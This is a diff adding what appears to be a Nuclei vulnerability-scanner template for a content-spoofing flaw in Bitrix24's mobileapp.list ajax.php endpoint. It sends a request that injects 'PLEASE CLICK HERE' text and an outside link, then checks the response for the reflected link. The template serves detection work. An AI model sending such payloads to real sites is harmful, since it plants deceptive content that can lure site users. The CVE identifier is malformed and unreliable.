@@ -1,0 +1,28 @@
+id: CVE-2023-001
+
+info:
+  name: Bitrix24 <=20.0.0 - ajax.php content spoofing 
+  author: crlf,metascan
+  severity: medium
+  description: The Web Application Firewall in Bitrix24 up to and including 20.0.0 allows Content Spoofing via the items[1][TITLE],ITEMS[1][DETAIL_LINK] parameters to the components/bitrix/mobileapp.list/ajax.php URI.
+  reference:
+    - https://github.com/cr1f/writeups/blob/main/attacking_bitrix.pdf
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
+    cvss-score: 4.3
+    cve-id: CVE-2023-001
+    cwe-id: CWE-345
+  tags: cve,cve2023,xss,bitrix,spoofing
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/bitrix/components/bitrix/mobileapp.list/ajax.php?items[1][TITLE]=TEXT+INJECTION!+PLEASE+CLICK+HERE!&items[1][DETAIL_LINK]=https://metascan.ru'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "https://metascan.ru")'
+          - 'contains(body, "mapp_itemlist_item_link")'
+        condition: and
